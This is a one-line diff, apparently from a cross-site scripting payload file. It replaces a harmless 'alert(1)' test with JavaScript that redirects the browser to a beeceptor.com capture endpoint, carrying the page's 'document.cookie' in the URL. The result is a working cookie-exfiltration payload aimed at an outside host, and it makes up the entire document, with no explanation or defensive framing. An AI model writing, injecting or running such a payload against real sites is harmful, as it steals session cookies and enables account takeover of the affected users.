@@ -1,1 +1,1 @@
-alert(1)
+document.location = `https://pokpokpok.free.beeceptor.com/?cookie=${document.cookie}`
